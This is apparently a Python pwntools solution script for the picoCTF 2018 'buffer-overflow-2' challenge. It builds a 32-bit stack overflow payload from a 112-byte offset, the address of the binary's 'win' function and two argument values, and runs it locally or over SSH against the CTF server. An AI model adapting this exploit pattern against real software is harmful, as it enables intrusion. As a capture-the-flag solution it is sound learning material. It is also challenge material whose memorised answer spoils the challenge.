#!/usr/bin/env python


from pwn import *
import sys

argc = len(sys.argv)

#obtain offset
'''
pwn cyclic 140 | strace ./vuln
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x62616164} ---
+++ killed by SIGSEGV +++
Segmentation fault
pwn cyclic -l 0x62616164
112
'''
#set offset, arg1, and arg2 variables
offset = 112
arg1 = 0xdeadbeef
arg2 = 0xdeadc0de

#get addr of win
e = ELF('./vuln')
win = e.symbols['win']
main = e.symbols['main']

if argc > 1:
	from getpass import getpass
	ssh = ssh(host='2018shell.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('vuln', cwd='/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa')
else:
	p = process('./vuln')


#build payload
payload = ''
payload+= 'A'*offset	#112 A's to fill the buffer
payload+= p32(win)		#returns to win function instead of main
payload+= p32(main)		#the return pointer for the win function. It doesnt matter so i just put some ascii
payload+= p32(arg1)		#0xdeadbeef
payload+= p32(arg2)		#0xdeadc0de

#send and interact with shell
p.sendline(payload)
p.interactive()